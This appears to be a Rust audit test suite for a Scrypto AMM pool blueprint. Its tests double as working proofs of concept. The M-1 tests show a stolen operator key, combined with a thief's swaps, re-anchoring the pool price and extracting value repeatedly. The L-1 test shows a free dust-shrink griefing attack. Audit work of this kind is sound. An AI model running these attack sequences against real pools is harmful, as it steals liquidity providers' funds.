//! Independent audit of the cold/hot split (branch `pool-split`, bd574a4 + 668f660). Each test PASSES
//! when the behaviour it documents is present in the blueprint: a test named `*_attack_*` passing
//! means the attack WORKS against the current code (invert it once the blueprint is fixed).
//! Findings: M-1 owner reserve calls re-anchor at the thief's price (two tests); L-1 free dust
//! shrink only the owner can undo; informational items; budget refill edge cases.

use scrypto_test::prelude::*;

const NO_GUARD: Option<(Decimal, Decimal)> = None;

#[derive(Clone, Copy)]
struct Actor {
    key: Secp256k1PublicKey,
    account: ComponentAddress,
}

#[derive(ScryptoSbor, Clone, Copy, Debug, PartialEq, Eq)]
struct Limits {
    move_budget_bps: u16,
    window_epochs: u64,
    max_reserve_a: Decimal,
    max_reserve_b: Decimal,
    min_fee_bps: u16,
    max_fee_bps: u16,
}

#[derive(ScryptoSbor, Debug, Clone, PartialEq)]
struct RebalanceEv {
    amount_a: Decimal,
    amount_b: Decimal,
    reserve_a: Decimal,
    reserve_b: Decimal,
    inventory_a: Decimal,
    inventory_b: Decimal,
    cost: Decimal,
    allowance: Decimal,
    by_owner: bool,
}

type Status = (Option<ResourceAddress>, Limits, Decimal, bool, (Decimal, Decimal));

struct W {
    ledger: DefaultLedgerSimulator,
    package: PackageAddress,
    owner: Actor,
    bot: Actor,
    other: Actor,
    badge: ResourceAddress,
    op: ResourceAddress,
    a: ResourceAddress,
    b: ResourceAddress,
}

impl W {
    fn new() -> Self {
        let mut ledger = LedgerSimulatorBuilder::new().build();
        let (key, _, account) = ledger.new_allocated_account();
        let (bkey, _, baccount) = ledger.new_allocated_account();
        let (okey, _, oaccount) = ledger.new_allocated_account();
        let package = ledger.compile_and_publish(this_package!());
        let badge = ledger.create_fungible_resource(dec!(1), 0, account);
        let op = ledger.create_fungible_resource(dec!(1), 0, baccount);
        let mut w = Self {
            ledger,
            package,
            owner: Actor { key, account },
            bot: Actor { key: bkey, account: baccount },
            other: Actor { key: okey, account: oaccount },
            badge,
            op,
            a: XRD,
            b: XRD,
        };
        w.a = w.token(dec!(1_000_000_000));
        w.b = w.token(dec!(1_000_000_000));
        let (bot, other, a, b) = (w.bot, w.other, w.a, w.b);
        for who in [bot, other] {
            w.give(who, a, dec!(1_000_000));
            w.give(who, b, dec!(1_000_000));
        }
        w
    }

    fn run(&mut self, signers: &[Actor], m: TransactionManifestV1) -> TransactionReceipt {
        let proofs = signers.iter().map(|s| NonFungibleGlobalId::from_public_key(&s.key)).collect::<Vec<_>>();
        self.ledger.execute_manifest(m, proofs)
    }

    fn token(&mut self, supply: Decimal) -> ResourceAddress {
        let o = self.owner;
        let m = ManifestBuilder::new()
            .lock_fee_from_faucet()
            .create_fungible_resource(OwnerRole::None, true, 18, FungibleResourceRoles::default(), metadata!(), Some(supply))
            .try_deposit_entire_worktop_or_abort(o.account, None)
            .build();
        self.ledger.execute_manifest(m, vec![]).expect_commit(true).new_resource_addresses()[0]
    }

    fn give(&mut self, to: Actor, r: ResourceAddress, amount: Decimal) {
        let o = self.owner;
        let m = ManifestBuilder::new().lock_fee_from_faucet().withdraw_from_account(o.account, r, amount)
            .try_deposit_entire_worktop_or_abort(to.account, None).build();
        self.run(&[o], m).expect_commit_success();
    }

    fn bal(&mut self, who: Actor, r: ResourceAddress) -> Decimal {
        self.ledger.get_component_balance(who.account, r)
    }

    fn pool(&mut self, ra: Decimal, rb: Decimal, fee: u16) -> ComponentAddress {
        let (o, badge, package, a, b) = (self.owner, self.badge, self.package, self.a, self.b);
        let m = ManifestBuilder::new()
            .lock_fee_from_faucet()
            .create_proof_from_account_of_amount(o.account, badge, dec!(1))
            .withdraw_from_account(o.account, a, ra)
            .withdraw_from_account(o.account, b, rb)
            .take_all_from_worktop(a, "a")
            .take_all_from_worktop(b, "b")
            .call_function_with_name_lookup(package, "OwnerPool", "instantiate_with_liquidity", |l| (l.bucket("a"), l.bucket("b"), fee, badge))
            .build();
        self.run(&[o], m).expect_commit_success().new_component_addresses()[0]
    }

    fn as_owner(&mut self, pool: ComponentAddress, method: &str, args: ManifestArgs) -> TransactionReceipt {
        let (o, badge) = (self.owner, self.badge);
        let m = ManifestBuilder::new().lock_fee_from_faucet()
            .create_proof_from_account_of_amount(o.account, badge, dec!(1))
            .call_method(pool, method, args).deposit_entire_worktop(o.account).build();
        self.run(&[o], m)
    }

    fn as_operator(&mut self, pool: ComponentAddress, method: &str, args: ManifestArgs) -> TransactionReceipt {
        let (bot, op) = (self.bot, self.op);
        let m = ManifestBuilder::new().lock_fee_from_faucet()
            .create_proof_from_account_of_amount(bot.account, op, dec!(1))
            .call_method(pool, method, args).deposit_entire_worktop(bot.account).build();
        self.run(&[bot], m)
    }

    fn appoint(&mut self, pool: ComponentAddress, holder: Actor, badge: ResourceAddress) -> TransactionReceipt {
        let (o, ob) = (self.owner, self.badge);
        let m = ManifestBuilder::new().lock_fee_from_faucet()
            .create_proof_from_account_of_amount(o.account, ob, dec!(1))
            .create_proof_from_account_of_amount(holder.account, badge, dec!(1))
            .call_method(pool, "set_operator", manifest_args!(Some(badge)))
            .build();
        self.run(&[o, holder], m)
    }

    #[allow(clippy::too_many_arguments)]
    fn set_limits(&mut self, pool: ComponentAddress, budget_bps: u16, window: u64, cap_a: Decimal, cap_b: Decimal, min_fee: u16, max_fee: u16) -> TransactionReceipt {
        self.as_owner(pool, "set_operator_limits", manifest_args!(budget_bps, window, cap_a, cap_b, min_fee, max_fee))
    }

    fn fund_inventory(&mut self, pool: ComponentAddress, xa: Decimal, xb: Decimal) -> TransactionReceipt {
        let (o, badge, a, b) = (self.owner, self.badge, self.a, self.b);
        let m = ManifestBuilder::new().lock_fee_from_faucet()
            .create_proof_from_account_of_amount(o.account, badge, dec!(1))
            .withdraw_from_account(o.account, a, xa)
            .withdraw_from_account(o.account, b, xb)
            .take_all_from_worktop(a, "a")
            .take_all_from_worktop(b, "b")
            .call_method_with_name_lookup(pool, "deposit_inventory", |l| (Some(l.bucket("a")), Some(l.bucket("b"))))
            .build();
        self.run(&[o], m)
    }

    fn rebalance(&mut self, pool: ComponentAddress, da: Decimal, db: Decimal) -> TransactionReceipt {
        self.as_operator(pool, "rebalance", manifest_args!(da, db, NO_GUARD))
    }

    fn swap(&mut self, who: Actor, pool: ComponentAddress, input: ResourceAddress, amount: Decimal) -> TransactionReceipt {
        let m = ManifestBuilder::new().lock_fee_from_faucet()
            .withdraw_from_account(who.account, input, amount)
            .take_all_from_worktop(input, "in")
            .call_method_with_name_lookup(pool, "swap", |l| (l.bucket("in"),))
            .deposit_entire_worktop(who.account).build();
        self.run(&[who], m)
    }

    fn read<T: ScryptoDecode>(&mut self, pool: ComponentAddress, method: &str) -> T {
        let m = ManifestBuilder::new().lock_fee_from_faucet().call_method(pool, method, manifest_args!()).build();
        self.ledger.execute_manifest(m, vec![]).expect_commit_success().output(1)
    }

    fn reserves(&mut self, pool: ComponentAddress) -> (Decimal, Decimal) {
        self.read(pool, "reserves")
    }

    fn inventory(&mut self, pool: ComponentAddress) -> (Decimal, Decimal) {
        self.read(pool, "inventory")
    }

    fn status(&mut self, pool: ComponentAddress) -> Status {
        self.read(pool, "operator_status")
    }

    fn total(&mut self, pool: ComponentAddress) -> (Decimal, Decimal) {
        let (ra, rb) = self.reserves(pool);
        let (ia, ib) = self.inventory(pool);
        (ra + ia, rb + ib)
    }

    fn epoch(&mut self) -> u64 {
        self.ledger.get_current_epoch().number()
    }

    fn advance(&mut self, epochs: u64) {
        let e = self.epoch();
        self.ledger.set_current_epoch(Epoch::of(e + epochs));
    }

    fn events<T: ScryptoDecode>(&self, r: &TransactionReceipt, name: &str) -> Vec<T> {
        r.expect_commit_success().application_events.iter()
            .filter(|(id, _)| self.ledger.event_name(id) == name)
            .map(|(_, d)| scrypto_decode::<T>(d).expect("event decodes"))
            .collect()
    }
}

fn f(d: Decimal) -> f64 {
    d.to_string().parse().unwrap()
}

fn dec_floor(x: f64, places: usize) -> Decimal {
    let s = format!("{:.*}", places + 2, x);
    Decimal::from_str(&s).unwrap().checked_round(places as u8, RoundingMode::ToZero).unwrap()
}

fn thief_value(w: &mut W, p_star: f64) -> f64 {
    let (bot, a, b) = (w.bot, w.a, w.b);
    f(w.bal(bot, a)) * p_star + f(w.bal(bot, b))
}

/// The design document's bound, S * C * psi(D + 2C) with S = 20,000 (caps 20k each, P* = 1).
fn design_bound(c: f64, d0: f64) -> f64 {
    let psi = |d: f64| 2.0 * ((d / 2.0).cosh() - 1.0) + (d / 2.0).sinh();
    20_000.0 * c * psi(d0 + 2.0 * c)
}

/// Buy A with B until the pool price (B per A) is `p_star`.
fn arb_to_buy_a(w: &mut W, pool: ComponentAddress, p_star: f64) {
    let (ra, rb) = w.reserves(pool);
    let (fa, fb) = (f(ra), f(rb));
    assert!(fb / fa < p_star);
    let y = dec_floor((fa * fb * p_star).sqrt() - fb, 6);
    let (bot, b) = (w.bot, w.b);
    w.swap(bot, pool, b, y).expect_commit_success();
}

/// The setup of the author's `stolen_operator_key_attack_is_bounded`: curve 18k/18k at P* = 1,
/// inventory 10k/10k, caps 20k, budget 10% per 100 epochs, operator fee range 0-100, fee 0.
fn setup(w: &mut W) -> ComponentAddress {
    let pool = w.pool(dec!(18_000), dec!(18_000), 0);
    w.fund_inventory(pool, dec!(10_000), dec!(10_000)).expect_commit_success();
    let (bot, op) = (w.bot, w.op);
    w.appoint(pool, bot, op).expect_commit_success();
    w.set_limits(pool, 1_000, 100, dec!(20_000), dec!(20_000), 0, 100).expect_commit_success();
    w.advance(100);
    pool
}

// ============================================================================ finding M-1

/// ANY owner call that touches the reserves (`deposit`, `withdraw`, `owner_rebalance`) resets the
/// anchor to the curve's CURRENT price, and the curve's current price is whatever the last swap left
/// it at, i.e. whatever the thief's own swap set. The design's bound assumes "the anchor moves only by
/// budgeted calls"; this breaks it.
///
/// 1. operator: free proportional shrink 18k/18k -> 4,564/4,564;
/// 2. thief: sells A with his own capital until A is at 1/16 B (X = ln 16 from the market);
/// 3. owner: reads the reserves and withdraws 1 B with the reserves guard (any reserve-touching owner
///    call works, guarded or not: the guard checks the reserves the owner just read);
/// 4. operator: regrows the curve by sqrt(1.199) AT the 1/16 price: costs only depth growth (~0.0995);
/// 5. thief: buys A back to the market price.
/// Without step 3, step 4 is refused (checked). With it, the thief nets ~ (L' - L) * 4 sinh^2(X/4).
#[test]
fn m1_attack_owner_call_resets_anchor_to_thief_price() {
    let mut w = W::new();
    let pool = setup(&mut w);
    let (bot, a, b) = (w.bot, w.a, w.b);
    let owner_total0 = w.total(pool);
    let v0 = thief_value(&mut w, 1.0);

    // 1. free shrink
    w.rebalance(pool, dec!(-13_436), dec!(-13_436)).expect_commit_success();
    assert_eq!(w.reserves(pool), (dec!(4_564), dec!(4_564)));
    // 2. thief's own swap: A to 1/16 B
    w.swap(bot, pool, a, dec!(13_692)).expect_commit_success();
    let (ra, rb) = w.reserves(pool);
    println!("M-1: curve price after the thief's swap {:.6} B per A", f(rb) / f(ra));

    let regrow = |w: &mut W| -> (Decimal, Decimal) {
        let (ra, rb) = w.reserves(pool);
        let m = dec!("1.094988"); // sqrt(1.199) rounded down: depth cost ~0.0995
        ((ra * (m - dec!(1))).checked_round(6, RoundingMode::ToZero).unwrap(), (rb * (m - dec!(1))).checked_round(6, RoundingMode::ToZero).unwrap())
    };
    // Control: without an owner call, the regrow is measured from the old anchor (1.0) and refused.
    let (da, db) = regrow(&mut w);
    w.rebalance(pool, da, db).expect_commit_failure_containing_error("Operator price-move limit");

    // 3. the owner takes 1 B of profit, guarded by the reserves he just read
    let (ra, rb) = w.reserves(pool);
    w.as_owner(pool, "withdraw", manifest_args!(dec!(0), dec!(1), Some((ra, rb)))).expect_commit_success();
    let anchor = w.status(pool).4;
    println!("M-1: anchor after the owner's withdraw {:?} (price {:.6})", anchor, f(anchor.1) / f(anchor.0));

    // 4. regrow at the thief's price
    let (da, db) = regrow(&mut w);
    let r = w.rebalance(pool, da, db);
    let ev: Vec<RebalanceEv> = w.events(&r, "OwnerPoolRebalanceEvent");
    let cost = f(ev[0].cost);
    println!("M-1: regrow at the thief's price accepted, cost {}, reserves ({}, {})", ev[0].cost, ev[0].reserve_a, ev[0].reserve_b);
    assert!(cost <= 0.1);

    // 5. back to market
    arb_to_buy_a(&mut w, pool, 1.0);
    let gain = thief_value(&mut w, 1.0) - v0;
    let (ta, tb) = w.total(pool);
    let owner_loss = f(owner_total0.0) + f(owner_total0.1) - f(ta) - f(tb) - 1.0; // the owner took 1 B
    let bound = design_bound(cost, 0.0);
    println!("M-1: thief gain {gain:.4}, owner loss {owner_loss:.4}; design bound at C = {cost:.4}, D = 0: {bound:.4}; author's measured A: 20.57");
    assert!((gain - owner_loss).abs() < 1e-3, "zero-sum at fee 0");
    assert!(gain > 3.0 * bound, "the attack beats the design bound by more than 3x");
    let _ = b;
}

/// Worse: the reset anchor STAYS at the thief's price (only budgeted calls move it, and the regrow
/// itself re-anchors there). After ONE owner call, the thief repeats the attack every window with no
/// further owner action: swap the curve back to the anchor price with his own capital, shrink to fit
/// the caps (near-proportional, ~free because P ~ A), regrow (depth cost only), sell back to market.
#[test]
fn m1_attack_repeats_every_window_after_one_owner_call() {
    let mut w = W::new();
    let pool = setup(&mut w);
    let (bot, a) = (w.bot, w.a);
    let v0 = thief_value(&mut w, 1.0);
    let mut spent = 0.0;
    let rounds = 3;
    for round in 0..rounds {
        if round == 0 {
            w.rebalance(pool, dec!(-13_436), dec!(-13_436)).expect_commit_success();
            w.swap(bot, pool, a, dec!(13_692)).expect_commit_success();
            let (ra, rb) = w.reserves(pool);
            w.as_owner(pool, "withdraw", manifest_args!(dec!(0), dec!(1), Some((ra, rb)))).expect_commit_success();
        } else {
            // The curve is back at ~market (1.0), the anchor still at ~1/16. A shrink here is free
            // only if EXACTLY proportional, so the thief first makes both reserves multiples of 2^12
            // attos with one tiny swap of his own (searched off ledger, replicating compute_swap at
            // fee 0), then shrinks by exactly m / 2^12.
            let (ra, rb) = w.reserves(pool);
            let q = I192::from(4096);
            let base = Decimal::from(f(ra).ceil() as u64 + 1); // whole tokens: attos divisible by 2^18
            let mut found = None;
            for j in 0..200_000u64 {
                let ra2 = base + Decimal::from_attos(I192::from(j) * q * I192::from(1_000_000_007i64));
                let x = ra2 - ra;
                let eff = PreciseDecimal::from(x);
                let share = eff.checked_div(PreciseDecimal::from(ra) + eff).unwrap();
                let out = Decimal::try_from((PreciseDecimal::from(rb) * share).checked_round(18, RoundingMode::ToNegativeInfinity).unwrap()).unwrap();
                let rb2 = rb - out;
                if rb2.attos() % q == I192::from(0) {
                    found = Some((x, ra2, rb2));
                    break;
                }
            }
            let (x, ra2, rb2) = found.expect("no aligning swap found");
            w.swap(bot, pool, a, x).expect_commit_success();
            assert_eq!(w.reserves(pool), (ra2, rb2));
            // exact proportional shrink by m / 4096 to L ~ 4,562 (free, anchor stays at ~1/16)
            let m = I192::from((4096.0 * 4562.0 / (f(ra2) * f(rb2)).sqrt()) as i64);
            let na = Decimal::from_attos(ra2.attos() / q * m);
            let nb = Decimal::from_attos(rb2.attos() / q * m);
            let r = w.rebalance(pool, na - ra2, nb - rb2);
            let ev: Vec<RebalanceEv> = w.events(&r, "OwnerPoolRebalanceEvent");
            assert_eq!(ev[0].cost, dec!(0), "exactly proportional shrink is free");
            // own capital: sell A until the curve sits at the anchor's price again
            let anchor = w.status(pool).4;
            let pa = f(anchor.1) / f(anchor.0);
            let (ra, rb) = w.reserves(pool);
            let x = dec_floor((f(ra) * f(rb) / pa).sqrt() - f(ra), 6);
            w.swap(bot, pool, a, x).expect_commit_success();
        }
        let (ra, rb) = w.reserves(pool);
        let m = dec!("1.094988");
        let r = w.rebalance(pool, (ra * (m - dec!(1))).checked_round(6, RoundingMode::ToZero).unwrap(), (rb * (m - dec!(1))).checked_round(6, RoundingMode::ToZero).unwrap());
        let ev: Vec<RebalanceEv> = w.events(&r, "OwnerPoolRebalanceEvent");
        spent += f(ev[0].cost);
        arb_to_buy_a(&mut w, pool, 1.0);
        println!("M-1 repeat: round {round}, thief gain so far {:.4}", thief_value(&mut w, 1.0) - v0);
        w.advance(100);
    }
    let gain = thief_value(&mut w, 1.0) - v0;
    println!("M-1 repeat: budget spent {spent:.4}, thief gain {gain:.4}, design bound {:.4}", design_bound(spent, 0.0));
    assert!(gain > design_bound(spent, 0.0));
}

// ============================================================================ L-1: dust shrink

/// A stolen key can shrink the curve to 1 atto per side for free. Swaps then fail for everyone and a
/// replacement bot cannot regrow it (depth growth from 1e-18 costs far more than any budget): only
/// the owner (cold) can restore the curve. Griefing, no loss.
#[test]
fn l1_dust_shrink_needs_the_owner_to_restore() {
    let mut w = W::new();
    let pool = w.pool(dec!(10_000), dec!(10_000), 30);
    w.fund_inventory(pool, dec!(1_000), dec!(1_000)).expect_commit_success();
    let (bot, other, op, a) = (w.bot, w.other, w.op, w.a);
    w.appoint(pool, bot, op).expect_commit_success();
    w.set_limits(pool, 300, 72, dec!(11_000), dec!(11_000), 10, 100).expect_commit_success();
    w.advance(72);
    let atto = Decimal::from_attos(I192::from(1));
    let shrink = dec!(10_000) - atto;
    let r = w.rebalance(pool, -shrink, -shrink);
    let ev: Vec<RebalanceEv> = w.events(&r, "OwnerPoolRebalanceEvent");
    assert_eq!(ev[0].cost, dec!(0));
    assert_eq!(w.reserves(pool), (atto, atto));
    w.swap(other, pool, a, dec!(1)).expect_commit_failure();
    // The bot (or a replacement) cannot regrow: refused by the budget.
    w.rebalance(pool, dec!(1_000), dec!(1_000)).expect_commit_failure_containing_error("Operator price-move limit");
    w.rebalance(pool, dec!(1), dec!(1)).expect_commit_failure_containing_error("Operator price-move limit");
    // The owner can.
    w.as_owner(pool, "owner_rebalance", manifest_args!(shrink, shrink, NO_GUARD)).expect_commit_success();
    assert_eq!(w.reserves(pool), (dec!(10_000), dec!(10_000)));
    w.swap(other, pool, a, dec!(1)).expect_commit_success();
}

// ============================================================================ informational

/// I-a: revoking the operator leaves its pause flag on (swaps stay stopped until the owner clears it).
/// I-b: the default operator fee range is the INSTANTIATION fee, so after the owner changes the fee
///      a newly appointed operator (default limits) can set it back.
/// I-c: the owner's pause does not stop operator moves (no loss: nobody can trade while paused).
/// I-d: a replacement operator inherits the thief's spent allowance and the thief's anchor; the owner
///      cannot top the allowance up, only wait or shorten the window.
#[test]
fn informational_revoke_pause_fee_range_inheritance() {
    let mut w = W::new();
    let pool = w.pool(dec!(10_000), dec!(10_000), 30);
    w.fund_inventory(pool, dec!(1_000), dec!(1_000)).expect_commit_success();
    let (bot, other, op, a) = (w.bot, w.other, w.op, w.a);
    // I-b
    w.as_owner(pool, "set_fee", manifest_args!(100u16)).expect_commit_success();
    w.appoint(pool, bot, op).expect_commit_success();
    w.as_operator(pool, "operator_set_fee", manifest_args!(30u16)).expect_commit_success();
    assert_eq!(w.read::<u16>(pool, "fee_bps"), 30);
    // I-c
    w.set_limits(pool, 300, 72, dec!(11_000), dec!(11_000), 10, 100).expect_commit_success();
    w.advance(72);
    w.as_owner(pool, "set_paused", manifest_args!(true)).expect_commit_success();
    w.rebalance(pool, dec!(100), dec!(0)).expect_commit_success();
    w.as_owner(pool, "set_paused", manifest_args!(false)).expect_commit_success();
    // I-d: the thief spends everything, then is replaced.
    let left = w.status(pool).2;
    println!("I-d: allowance left after the thief's move {left}");
    let anchor_thief = w.status(pool).4;
    // I-a
    w.as_operator(pool, "set_operator_paused", manifest_args!(true)).expect_commit_success();
    w.as_owner(pool, "set_operator", manifest_args!(None::<ResourceAddress>)).expect_commit_success();
    w.swap(other, pool, a, dec!(1)).expect_commit_failure_containing_error("Swaps are paused");
    w.as_owner(pool, "set_operator_paused", manifest_args!(false)).expect_commit_success();
    w.swap(other, pool, a, dec!(1)).expect_commit_success();
    // I-d continued: new operator, same allowance and anchor; owner re-setting limits does not top up.
    let op2 = w.ledger.create_fungible_resource(dec!(1), 0, other.account);
    w.appoint(pool, other, op2).expect_commit_success();
    w.set_limits(pool, 300, 72, dec!(11_000), dec!(11_000), 10, 100).expect_commit_success();
    let (_, _, allowance, _, anchor) = w.status(pool);
    assert_eq!(anchor, anchor_thief);
    assert!(allowance <= left + dec!("0.0001"));
}

// ============================================================================ budget edge cases

/// Refill arithmetic at the extremes: window = u64::MAX with a huge epoch gap, window 1, a budget
/// raised from 0 (no retroactive grant), and a cut budget clipping the allowance.
#[test]
fn budget_refill_edges() {
    let mut w = W::new();
    let pool = w.pool(dec!(10_000), dec!(10_000), 0);
    w.fund_inventory(pool, dec!(10_000), dec!(10_000)).expect_commit_success();
    let (bot, op) = (w.bot, w.op);
    w.appoint(pool, bot, op).expect_commit_success();
    // Budget 0 for a long time, then raised: nothing accrued for the past.
    w.advance(1_000_000);
    w.set_limits(pool, 10_000, u64::MAX, dec!(1_000_000), dec!(1_000_000), 0, 0).expect_commit_success();
    assert_eq!(w.status(pool).2, dec!(0));
    // A huge gap (2^40 epochs) under a u64::MAX window: accrues 2^40 / 2^64 of the budget, no overflow.
    w.advance(1u64 << 40);
    let have = w.status(pool).2;
    println!("budget edges: allowance after 2^40 epochs of a u64::MAX window: {have}");
    assert!(have > dec!(0) && have < dec!("0.0001"));
    // Window 1: full after one epoch, never above one budget.
    w.set_limits(pool, 10_000, 1, dec!(1_000_000), dec!(1_000_000), 0, 0).expect_commit_success();
    w.advance(5);
    assert_eq!(w.status(pool).2, dec!(1));
    // Cut to 100 bps: clipped.
    w.set_limits(pool, 100, 1, dec!(1_000_000), dec!(1_000_000), 0, 0).expect_commit_success();
    assert_eq!(w.status(pool).2, dec!("0.01"));
    // An add of 1% costs 0.01 + 0.005 (depth): refused. A 1%-ish removal costs only the price move.
    w.rebalance(pool, dec!(0), dec!(100)).expect_commit_failure_containing_error("Operator price-move limit");
    w.rebalance(pool, dec!(0), dec!(-99)).expect_commit_success();
    assert!(w.status(pool).2 < dec!("0.0001"));
}
